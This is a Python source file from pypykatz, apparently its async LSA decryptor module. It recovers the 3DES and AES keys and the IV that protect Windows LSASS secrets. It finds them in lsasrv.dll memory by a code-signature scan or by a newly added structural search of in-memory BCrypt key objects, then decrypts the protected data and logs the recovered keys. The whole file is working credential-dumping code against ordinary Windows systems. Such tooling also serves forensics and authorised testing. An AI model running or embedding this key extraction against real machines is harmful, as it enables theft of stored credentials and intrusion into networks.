#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#


import struct

from pypykatz import logger
from pypykatz.commons.common import hexdump
from unicrypto.symmetric import MODE_CBC, MODE_CFB, AES, TDES
from pypykatz.alsadecryptor.package_commons import PackageDecryptor

class LsaDecryptor_NT6(PackageDecryptor):
	def __init__(self, reader, decryptor_template, sysinfo):
		super().__init__('LsaDecryptor', None, sysinfo, reader)
		self.decryptor_template = decryptor_template
		self.iv = None
		self.aes_key = None
		self.des_key = None

	async def acquire_crypto_material(self):
		self.log('Acquireing crypto stuff...')
		try:
			sigpos = await self.find_signature()
		except Exception as e:
			# Newer builds (24H2/25H2 and some servicing levels) reference the LSA
			# key globals base-relative, defeating the rip-relative signature scan.
			# Fall back to a build-independent structural search of the key objects.
			self.log('Signature search failed (%s). Falling back to structural key search.' % e)
			if not await self.acquire_crypto_material_structural():
				raise
			return
		await self.reader.move(sigpos)
		data = await self.reader.peek(0x50)
		self.log('Memory looks like this around the signature\n%s' % hexdump(data, start = sigpos))
		self.iv = await self.get_IV(sigpos)
		self.des_key = await self.get_des_key(sigpos)
		self.aes_key = await self.get_aes_key(sigpos)

	async def acquire_crypto_material_structural(self):
		"""
		Build-independent fallback that locates the LSA 3DES/AES BCrypt keys and
		the shared IV by walking the in-memory key objects (KIWI_BCRYPT_KEY 'KSSM'
		blobs and KIWI_BCRYPT_HANDLE_KEY 'RUUU' handles) and the adjacent
		hAesKey/h3DesKey global pointers in lsasrv.dll, instead of a code signature.
		See the sync LsaDecryptor_NT6 for the detailed rationale.
		"""
		reader = self.reader
		base_reader = reader.reader
		module = base_reader.get_module_by_name('lsasrv.dll')
		if module is None:
			self.log('lsasrv.dll module not found, cannot run structural key search')
			return False

		async def read_at(va, n):
			await reader.move(va)
			return await reader.read(n)

		kssm_keys = {}
		for tag_va in await reader.find_all_global(b'KSSM'):
			struct_base = tag_va - 4
			try:
				blob = await read_at(struct_base, 0x60)
			except Exception:
				continue
			for off in range(0x18, 0x50, 4):
				cb = struct.unpack('<I', blob[off:off + 4])[0]
				if cb in (16, 24, 32):
					try:
						kssm_keys[struct_base] = await read_at(struct_base + off + 4, cb)
					except Exception:
						pass
					break

		handle_keys = {}
		for tag_va in await reader.find_all_global(b'RUUU'):
			handle_base = tag_va - 4
			try:
				blob = await read_at(handle_base, 0x20)
			except Exception:
				continue
			ptr_key = struct.unpack('<Q', blob[16:24])[0]
			if ptr_key in kssm_keys:
				handle_keys[handle_base] = kssm_keys[ptr_key]

		for seg in base_reader.memory_segments:
			if not (module.baseaddress <= seg.start_virtual_address < module.endaddress):
				continue
			try:
				buf = await read_at(seg.start_virtual_address, seg.end_virtual_address - seg.start_virtual_address)
			except Exception:
				continue
			for i in range(16, len(buf) - 16, 8):
				ptr_a = struct.unpack('<Q', buf[i:i + 8])[0]
				ptr_b = struct.unpack('<Q', buf[i + 8:i + 16])[0]
				if ptr_a not in handle_keys or ptr_b not in handle_keys:
					continue
				key_a = handle_keys[ptr_a]
				key_b = handle_keys[ptr_b]
				lens = {len(key_a), len(key_b)}
				if lens == {24, 16} or lens == {24, 32}:
					self.des_key = key_a if len(key_a) == 24 else key_b
					self.aes_key = key_b if len(key_a) == 24 else key_a
					self.iv = buf[i - 16:i]
					self.log('Structural key search succeeded @ %s' % hex(seg.start_virtual_address + i))
					self.log('IV  (%d): %s' % (len(self.iv), self.iv.hex()))
					self.log('DES (%d): %s' % (len(self.des_key), self.des_key.hex()))
					self.log('AES (%d): %s' % (len(self.aes_key), self.aes_key.hex()))
					return True

		self.log('Structural key search did not find the LSA keys')
		return False
		
	async def get_des_key(self, pos):
		self.log('Acquireing DES key...')
		return await self.get_key(pos, self.decryptor_template.key_pattern.offset_to_DES_key_ptr)
		
	async def get_aes_key(self, pos):
		self.log('Acquireing AES key...')
		return await self.get_key(pos, self.decryptor_template.key_pattern.offset_to_AES_key_ptr)
		
	async def find_signature(self):
		self.log('Looking for main struct signature in memory...')
		fl = await self.reader.find_in_module('lsasrv.dll', self.decryptor_template.key_pattern.signature, find_first = True)
		if len(fl) == 0:
			logger.debug('signature not found! %s' % self.decryptor_template.key_pattern.signature.hex())
			raise Exception('LSA signature not found!')
			
		self.log('Found candidates on the following positions: %s' % ' '.join(hex(x) for x in fl))
		self.log('Selecting first one @ 0x%08x' % fl[0])
		return fl[0]

	async def get_IV(self, pos):
		self.log('Reading IV')
		#print('Offset to IV: %s' % hex(self.decryptor_template.key_pattern.offset_to_IV_ptr))
		ptr_iv = await self.reader.get_ptr_with_offset(pos + self.decryptor_template.key_pattern.offset_to_IV_ptr)
		self.log('IV pointer takes us to 0x%08x' % ptr_iv)
		await self.reader.move(ptr_iv)
		data = await self.reader.read(self.decryptor_template.key_pattern.IV_length)
		self.log('IV data: %s' % hexdump(data))
		return data

	async def get_key(self, pos, key_offset):
		ptr_key = await self.reader.get_ptr_with_offset(pos + key_offset)
		self.log('key handle pointer is @ 0x%08x' % ptr_key)
		ptr_key = await self.reader.get_ptr(ptr_key)
		self.log('key handle is @ 0x%08x' % ptr_key)
		await self.reader.move(ptr_key)
		data = await self.reader.peek(0x50)
		self.log('BCRYPT_HANLE_KEY_DATA\n%s' % hexdump(data, start = ptr_key))
		kbhk = await self.decryptor_template.key_handle_struct.load(self.reader)
		if kbhk.verify():
			ptr_key = kbhk.ptr_key.value
			await self.reader.move(ptr_key)
			data = await self.reader.peek(0x50)
			self.log('BCRYPT_KEY_DATA\n%s' % hexdump(data, start = ptr_key))
			kbk = await kbhk.ptr_key.read(self.reader, self.decryptor_template.key_struct)
			self.log('HARD_KEY SIZE: 0x%x' % kbk.size)
			if kbk.verify():
				self.log('HARD_KEY data:\n%s' % hexdump(kbk.hardkey.data))
				return kbk.hardkey.data

	def decrypt(self, encrypted, segment_size=128):
		# TODO: NT version specific, move from here in subclasses.
		cleartext = b''
		size = len(encrypted)
		if size:
			if size % 8:
				if not self.aes_key or not self.iv:
					return cleartext
				cipher = AES(self.aes_key, MODE_CFB, self.iv, segment_size=segment_size)
				cleartext = cipher.decrypt(encrypted)
			else:
				if not self.des_key or not self.iv:
					return cleartext
				cipher = TDES(self.des_key, MODE_CBC, self.iv[:8])
				cleartext = cipher.decrypt(encrypted)
		return cleartext

	def dump(self):
		self.log('Recovered LSA encryption keys\n')
		self.log('IV ({}): {}'.format(len(self.iv), self.iv.hex()))
		self.log('DES_KEY ({}): {}'.format(len(self.des_key), self.des_key.hex()))
		self.log('AES_KEY ({}): {}'.format(len(self.aes_key), self.aes_key.hex()))